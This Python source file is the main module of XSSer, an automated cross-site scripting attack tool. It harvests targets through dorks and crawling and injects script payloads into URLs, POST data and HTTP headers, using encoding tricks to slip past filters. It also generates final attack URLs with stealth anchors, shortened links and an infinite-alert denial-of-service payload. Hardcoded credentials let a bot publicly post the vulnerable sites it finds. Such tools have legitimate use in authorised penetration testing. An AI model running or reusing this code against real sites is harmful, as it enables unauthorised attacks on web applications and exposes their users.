#!/usr/bin/python
# -*- coding: iso-8859-15 -*-

import re, sys, datetime, hashlib
import traceback
import fuzzing
import fuzzing.vectors
from curlcontrol import Curl
from encdec import EncoderDecoder
from options import XSSerOptions
from dork import Dorker
from crawler import Crawler
from post.shorter import ShortURLReservations
from imagexss import ImageInjections
from publish import publisher
from post.xml_exporter import xml_reporting 

# set to emit debug messages about errors.
DEBUG = 0

class XSSer(EncoderDecoder):
    """
    XSSer application class
    """
    def __init__(self):
        # initialize the url encoder/decoder
        EncoderDecoder.__init__(self)

        # your unique real opponent
        self.time = datetime.datetime.now()

        # this payload comes with vector already..
        #self.DEFAULT_XSS_PAYLOAD = '"><img src=x onerror=alert("XSS");>'
        self.DEFAULT_XSS_PAYLOAD = '"><script>alert("XSS")</script>'

        # to be or not to be...
        self.hash_found = []
        self.hash_notfound = []

        # xsser verbosity (0 - no output, 1 - dots only, 2+ - real verbosity)
        self.verbose = 2
        self.options = None

	# define some stadistics counters  
        self.success_connection = 0
        self.not_connection = 0 
        self.forwarded_connection = 0
        self.other_connection = 0
        self.total_vectors = 0
        self.other_injections = 0 

    def generate_hash(self, attack_type='default'):
        """
        generate a new hash for a type of attack.
        """
        return hashlib.md5(str(datetime.datetime.now()) + attack_type).hexdigest()

    def report(self, msg, level='info'):
        """
        Report some error from the application.

        levels: debug, info, warning, error
        """
        if self.verbose == 2:
            prefix = ""
            if level != 'info':
                prefix = "["+level+"] "
            print msg
        elif self.verbose:
            if level == 'error':
                sys.stdout.write("*")
            else:
                sys.stdout.write(".")

    def set_options(self, options):
        """
        Set xsser options
        """
        self.options = options
        self._opt_request()

    def _opt_request(self):
        """
        Pass on some properties to Curl
        """
        options = self.options
        for opt in [
			'cookie', 'agent', 'referer', 
			'headers', 'atype', 'acred', 
			'proxy', 'timeout', 'delay', 
			'threads', 'retries'
			]:
            if hasattr(options, opt) and getattr(options, opt):
                setattr(Curl, opt, getattr(options, opt))

    # attack functions
    def get_payloads(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        options = self.options
        if options.fuzz:
            payloads = fuzzing.vectors.vectors
        
        elif options.script:
            payloads = [{"payload":options.script, "browser":"[try :-P]"}]

        else:
            payloads = [
			    {"payload":self.DEFAULT_XSS_PAYLOAD, 
				    "browser":"[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"}
			    ]
        return payloads
    
    def process_ipfuzzing(self, text):
        """
        Mask ips in given text to DWORD
        """
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipDwordEncode(ip)))
        return text

    def process_ipfuzzing_octal(self, text):
        """
	Mask ips in given text to Octal
	"""
        ips = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)
        for ip in ips:
            text = text.replace(ip, str(self._ipOctalEncode(ip)))
        return text

    def process_payloads_ipfuzzing(self, payloads):
        """
        Mask ips for all given payloads using DWORD
        """
        # ip fuzzing (DWORD)
        if self.options.Dwo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def process_payloads_ipfuzzing_octal(self, payloads):
        """ 
        Mask ips for all given payloads using OCTAL
        """
        # ip fuzzing (OCTAL)
        if self.options.Doo:
            resulting_payloads = []
            for payload in payloads:
                payload["payload"] = self.process_ipfuzzing_octal(payload["payload"])
                resulting_payloads.append(payload)
            return resulting_payloads
        return payloads

    def get_query_string(self):
        """
        Get the supplied query string.
        """
        if self.options.postdata:
            return self.options.postdata
        elif self.options.getdata:
            return self.options.getdata
        return ""

    def attack_url(self, url, payloads, query_string):
        """
        Attack the given url.
        """
        for payload in payloads:
            self.attack_url_payload(url, payload, query_string)

    def get_url_payload(self, url, payload, query_string, attack_payload=None):
        """
        Attack the given url with the given payload
        """
        options = self.options

        self._ongoing_attacks = {}

        # get payload/vector
        if options.script:
            payload_string = options.script
        else:
            payload_string = payload['payload'].strip()

        # substitute the attack hash
        orig_hash = self.generate_hash('url')
        self.report("[+] \033[1;31mHashing:\033[1;m " + orig_hash)
        hashed_payload = payload_string.replace('XSS', orig_hash)
        if attack_payload:
            # url for real attack
            hashed_vector_url = self.encoding_permutations(attack_payload)
        else:
            # test
            hashed_vector_url = self.encoding_permutations(hashed_payload)

        self._ongoing_attacks['url'] = hashed_payload
        
        if 'PAYLOAD' in url:
            # this url comes with vector included
            dest_url = url.strip().replace('PAYLOAD', hashed_vector_url)
        else:
            payload_url = query_string.strip() + hashed_vector_url
            dest_url = url.strip() + "/" + payload_url
        return dest_url

    def attack_url_payload(self, url, payload, query_string):

        c= Curl()
        try:
            if self.options.getdata or not self.options.postdata:
                dest_url = self.get_url_payload(url, payload, query_string)
                self._prepare_extra_attacks()
                c.get(dest_url)
            if self.options.postdata:
                dest_url = self.get_url_payload("", payload, query_string)
                dest_url = dest_url.strip().replace("/", "", 1)
                c.post(url, dest_url)
        except:
            if DEBUG:
                traceback.print_exc()
            self.report("Error attacking: " + dest_url, "error")
            c.close()
            return
        
        if c.info()["http-code"] == "200":
            if self.options.statistics:
                self.success_connection = self.success_connection + 1
            self._report_attack_success(c, dest_url, payload,
                                        query_string, url)
        else:
            self._report_attack_failure(c, dest_url, payload,
                                        query_string, url)
        c.close()

    def encoding_permutations(self, enpayload_url):
        """
        Perform encoding permutations on the url and query_string.
        """
        options = self.options
        if options.Cem: # user asked for encoding permutations, so pleasing him
            enc_perm = options.Cem.split(",")
            for _enc in enc_perm:
                enpayload_url   = self.encmap[_enc](enpayload_url)
        else: # no encoding permutations
            for enctype in self.encmap.keys():
                if getattr(options, enctype):
                    enpayload_url   = self.encmap[enctype](enpayload_url)
        return enpayload_url

    def _report_attack_success(self, curl_handle, dest_url, payload,
                               query_string, orig_url):
        """
        report success of an attack
        """
        options = self.options
        self.report("[+] \033[1;33mTrying:\033[1;m " + dest_url.strip(), 'info')

        if options.script:
            self.report("[+] \033[1;35mBrowser Support:\033[1;m Manual Injection")
        else:
            self.report("[+] \033[1;35mBrowser Support:\033[1;m" + payload['browser'])
    
        if options.verbose:
            self.report("[-] \033[1;36mHeaders Results:\033[1;m\n")
            self.report(curl_handle.info())
            self.report("[-] \033[1;31mInjection Results:\n\033[1;m")
 
        # check attacks success
        for attack_type in self._ongoing_attacks:
            hashing = self._ongoing_attacks[attack_type]
            if hashing in curl_handle.body():
                self.add_success(dest_url, payload, hashing, query_string, orig_url, attack_type)
            else:
                self.add_failure(dest_url, payload, hashing, query_string, attack_type)
            
    def add_failure(self, dest_url, payload, hashing, query_string, method='url'):
        """
        Add an attack that failed to inject
        """
        self.report("[+] \033[1;36mChecking:\033[1;m " + method + " attack with " + hashing + "... fail")
        options = self.options
        if options.script:
            self.hash_notfound.append((dest_url, "Manual injection", method, hashing))
        else:
            self.hash_notfound.append((dest_url, payload['browser'], method, hashing))
        if options.verbose:
            self.report("Searching hash: " + hashing + " in target source code...\n")
            self.report("Injection failed!. Hash not found...\n")

    def add_success(self, dest_url, payload, hashing, query_string, orig_url, method='url'):
        """
        Add an attack that managed to inject the code
        """
        self.report("[+] \033[1;36mChecking:\033[1;m " + method + " attack with " + hashing + "... ok")
        if self.options.xsa or self.options.xsr or self.options.coo:
            self.other_injections = self.other_injections +1
        if self.options.script:
            self.hash_found.append((dest_url, "Manual injection", method, hashing, query_string, payload, orig_url))
        else:
            self.hash_found.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
 
        if self.options.verbose:
            self.report("Searching hash: " + hashing + " in target source code...\n")
            self.report("Seems that this injection was a success!! :)\n")

    def _report_attack_failure(self, curl_handle, dest_url, payload,
                               attack_vector, orig_url):
        """
        report failure of an attack
        """
        options = self.options
        if options.script:
            self.hash_notfound.append((dest_url, "Manual injection", "errorcode"))
        else:
            self.hash_notfound.append((dest_url, payload['browser'], "errorcode"))

        self.report("[+] \033[1;33mTrying:\033[1;m " + dest_url.strip())
        
        if options.script:
            self.report("[+] \033[1;35mBrowser Support:\033[1;m Manual injection")
        else:
            self.report("[+] \033[1;35mBrowser Support:\033[1;m " + payload['browser'])
        
        if options.verbose:
            self.report("[-] \033[1;36mHeaders Results:\033[1;m\n")
            self.report(str(curl_handle.info()))
          
            self.report("[-] \033[1;36mInjection Results:\033[1;m)")
                
        self.report("Not injected!. Servers response with http-code different \
                    to: 200 OK (" + str(curl_handle.info()["http-code"]) + ")")

        if self.options.statistics:
            if str(curl_handle.info()["http-code"]) == "400":
                self.not_connection = self.not_connection + 1
            elif str(curl_handle.info()["http-code"]) == "503":
                self.forwarded_connection = self.forwarded_connection + 1
            else:
                self.other_connection = self.other_connection + 1
        
    def check_positive(self, curl_handle, dest_url, payload, attack_vector):
        """
        Perform extra check for positives
        """
        body = curl_handle.body()
        # should check ongoing_attacks here
        # perform extra checks
        pass

    def create_options(self):
        """
        Create the program options for OptionParser.
        """
        self.optionParser = XSSerOptions()
        self.options = self.optionParser.get_options()
        if not self.options:
            return False
        return self.options

    def _get_attack_urls(self):
        """
        Process payload options and make up the payload list for the attack.
        """
        options = self.options
        p = self.optionParser
        if options.imx:
            self.create_fake_image(options.imx, options.script)
            sys.exit()
	    
        if options.url:
            self.report('='*75)
            self.report("\n " + str(p.version))
            self.report('='*75)
            self.report("Testing [\033[1;33mXSS from URL\033[1;m] injections...good luck ;)")
            urls = [options.url]
                    
        elif options.readfile:
            self.report('='*75)
            self.report("\n" + str(p.version))
            self.report('='*75)
            self.report("Testing [\033[1;33mXSS from file\033[1;m] injections...good luck ;)")
            
            #XXX: need to check if the file have a valid data.
            f = open(options.readfile)
            urls = f.readlines()
            urls = [ line.replace('\n','') for line in urls ]
            f.close()

        elif options.dork:
            self.report('='*75)
            self.report("\n" + str(p.version))
            self.report('='*75)
            self.report("Testing [\033[1;33mXSS from Dork\033[1;m] injections...good luck ;)")
            self.report('='*75)
            dorker = Dorker(options.dork_engine)
            urls = dorker.dork(options.dork)

        if options.crawling:
            #XXX should check crawling parameter validity
            crawler_urls = []
            crawler = Crawler()
            if options.crawling_width:
                crawling_width = int(options.crawling_width)
            else:
                crawling_width = 0
            for url in urls:
                crawler_urls += crawler.crawl(url,
                                              int(options.crawling),
                                              crawling_width)
            return crawler_urls
        if not options.imx:
            return urls

    def try_running(self, func, error, args=[]):
        """
        Try running a function and print some error if it fails and exists with
        a fatal error.
        """
        try:
            return func(*args)
        except Exception, e:
            self.report(error, "error")
            self.report(str(e.message), "error")
            if DEBUG:
                traceback.print_exc()
            sys.exit()

    def create_fake_image(self, filename, payload):
        """
        Create -fake- image with code injected
        """
        options = self.options
        filename = options.imx
        payload = options.script
        image_xss_injections = ImageInjections()
        image_injections = image_xss_injections.image_xss(options.imx , options.script)
        return image_injections

    def run(self):
        """
        Run xsser.
        """
        options = self.options
        # step 0: third party tricks
        if options.imx: # create -fake- image with code injected
            p = self.optionParser
            self.report('='*75)
            self.report("\n " + str(p.version))
            self.report('='*75)
            self.report("[\033[1;33mImage XSS auto-builder\033[1;m]...remember, only IE6 and below versions ;)")
            self.report('='*75)
            self.report(''.join(self.create_fake_image(self.options.imx, self.options.script)))
            self.report('='*75 + "\n")

        # step 1: get urls
        urls = self.try_running(self._get_attack_urls, "Internal error getting targets. Revise URL(s) and Dork syntaxis. Error info:")
        # step 2: get payloads
        payloads = self.try_running(self.get_payloads, "Internal error getting payloads")
        if options.Dwo:
            payloads = self.process_payloads_ipfuzzing(payloads)
        elif options.Doo:
            payloads = self.process_payloads_ipfuzzing_octal(payloads)
        # step 3: get query string
        query_string = self.try_running(self.get_query_string, "Internal error getting query string")
        # step 4: print curl options if requested
        if options.verbose:
            Curl.print_options()
        # step 5: perform attack
        self.try_running(self.attack, "Internal error running attack", (urls, payloads, query_string))
        if options.statistics:
            self.total_vectors = self.total_vectors + 1
        # step 6: print results
        if options.filexml:
            xml_report_results = xml_reporting(self)
            xml_report_results.print_xml_results(self.options.filexml)
	# step 7: publish on social networking sites (identica)
	# Edit username/password
	# to create your own bot
        if options.tweet and self.hash_found:
            for line in self.hash_found:
                sns_publish_results = publisher(self)
                msg = '#xss : ' + str(line[0])
                service = 'http://identi.ca'
                username = 'xsserbot01'
                password = '8vnVw8wvs'
                url = 'http://identi.ca/api/statuses/update.xml'
                sns_publish_results.send_to_identica(msg, username, password, url)
        self.print_results()
    
    def _prepare_extra_attacks(self):
        """
        Setup extra attacks.
        """
        options = self.options
        if options.xsa:
            hashing = self.generate_hash('xsa');
            Curl.agent = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['xsa'] = hashing
        
        if options.xsr:
            hashing = self.generate_hash('xsr');
            Curl.referer = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['xsr'] = hashing
	
        if options.coo:
            hashing = self.generate_hash('cookie');
            Curl.cookie = "<script>alert('" + hashing + "')</script>"
            self._ongoing_attacks['cookie'] = hashing

    def attack(self, urls, payloads, query_string):
        """
        Perform an attack on the given urls, with the provided payloads and
        query_string.
        """
        for url in urls:
            self.report("\n"+'='*75)
            self.report("\033[1;34mTarget:\033[1;m " + url + " \033[1;34m-->\033[1;m " + str(self.time))
            self.report('='*75 + "\n")
            self.attack_url(url, payloads, query_string)

    def generate_real_attack_url(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        """
        Generate a real attack url, by using data from a successfull test run, but setting
	a real attack payload.

	This method also applies DOM stealth mechanisms.
        """
        user_attack_payload = "<script>alert('XSS')</script>"
        if self.options.finalpayload:
            user_attack_payload = self.options.finalpayload
        if self.options.dos:
            user_attack_payload = '<script>for(;;)alert("You was XSSed!!");</script>'		
        do_anchor_payload = self.options.anchor
        anchor_data = None
        if do_anchor_payload:
            attack_payload = user_attack_payload
            dest_url = self.get_url_payload(orig_url, payload, query_string, attack_payload)
            dest_url = dest_url.replace('?', '#')
        else:
            attack_payload = user_attack_payload
            dest_url = self.get_url_payload(orig_url, payload, query_string, attack_payload)
        return dest_url

    def apply_postprocessing(self, dest_url, description, method, hashing, query_string, payload, orig_url):
        real_attack_url = self.generate_real_attack_url(dest_url, description, method, hashing, query_string, payload, orig_url)
        generate_shorturls = self.options.shorturls
        if generate_shorturls:
            shortener = ShortURLReservations(self.options.shorturls)
            shorturl = shortener.process_url(dest_url)
            print "[*] Shortered url:", shorturl
        return real_attack_url

    def print_results(self):
        """
        Print results from an attack.
        """
	# some bad situations:
        if len(self.hash_found) + len(self.hash_notfound) == 0:
            print "\n...is -something- blocking our connections!!?\n"
            sys.exit()
        print '='*75
        print "[*] \033[1;37mFinal Results:\033[1;m"
        print '='*75 + '\n'
        total_injections = len(self.hash_found) + len(self.hash_notfound)
        print "- Injections:", total_injections
        print "- Failed:", len(self.hash_notfound)
        print "- Sucessfull:", len(self.hash_found)
        print "- Accur:" , (len(self.hash_found) * 100) / total_injections, '%' , '\n'
        print '='*75
	# some stadistics reports
        if self.options.statistics:
            print "[*] \033[1;37mStadistics:\033[1;m"
            print '='*75
            test_time = datetime.datetime.now() - self.time
            print "\nTest Time Duration: ", test_time
            print '-'*50
            total_connections = self.success_connection + self.not_connection + self.forwarded_connection + self.other_connection
            print "Connections:", total_connections
            print "200-OK:" , self.success_connection , "|",  "400:" , self.not_connection , "|" , "503:" , self.forwarded_connection , "|" , "Others:", self.other_connection
            print "Accur:" , (self.success_connection * 100) / total_connections, '%'
            print '-'*50
            print "Injections:" , total_injections
            print "Vectors:" , total_injections - self.other_injections , "|" , "Specials:" , self.other_injections
            print '-'*50
            print "Sucessfull:" , len(self.hash_found) , "|" , "Failed:" , len(self.hash_notfound)
            print "Accur:" , (len(self.hash_found) * 100) / total_injections, '%' , '\n' 
            print '='*75
        print "[*] \033[1;37mList of possible XSS injections:\033[1;m"
        print '='*75 + '\n'

        for line in self.hash_found:
            print "[+] Injection:","\033[1;34m",line[0],"\033[1;m"
            attack_url = self.apply_postprocessing(line[0], line[1], line[2], line[3], line[4], line[5], line[6])
            if not attack_url == line[0]:
                print "[!] Final Attack:", attack_url
            print "[-] Browsers:", line[1]
            print "[-] Method:", line[2]
            if self.options.tweet:
            # XXX needs recover sns and username automatically
                print "[!] Published on: " + "http://identi.ca/" + "xsserbot01"

            # XXX real attacks should be generated before doing the following
            if self.options.fileoutput:
                fout = open("XSSlist.dat", "a")
                fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                fout.write("---------------------" + "\n")
                fout.write("[*] Target: " + line[6] + "\n")
                fout.write("[+] Injection: " + line[0] + "\n")
                if not attack_url == line[0]:
                    fout.write("[!] Final Attack: " + attack_url + "\n")
                fout.write("[-] Browsers: "+ line[1] + "\n")
                fout.write("[-] Method: "+ line[2] + "\n")
                fout.write("="*75 + "\n")
            print '='*15

        if not len(self.hash_found) and self.hash_notfound:
            print "Could not find any!!... Try another combination or hack it -manually- :)\n"
            print '='*75 + '\n'
            if self.options.fileoutput:
                fout = open("XSSlist.dat", "a")
                fout.write("\n" + "XSSer Security Report: " + str(datetime.datetime.now()) + "\n")
                fout.write("---------------------" + "\n")
                fout.write("[!] Not reported 'positive' results for: \n" + "[-] " + str('\n[-] '.join([u[0] for u in self.hash_notfound])) + "\n")
                fout.write("="*75 + "\n")
                fout.close()

if __name__ == "__main__":
    app = XSSer()
    options = app.create_options()
    if not options:
        sys.exit()
    app.set_options(options)
    app.run()
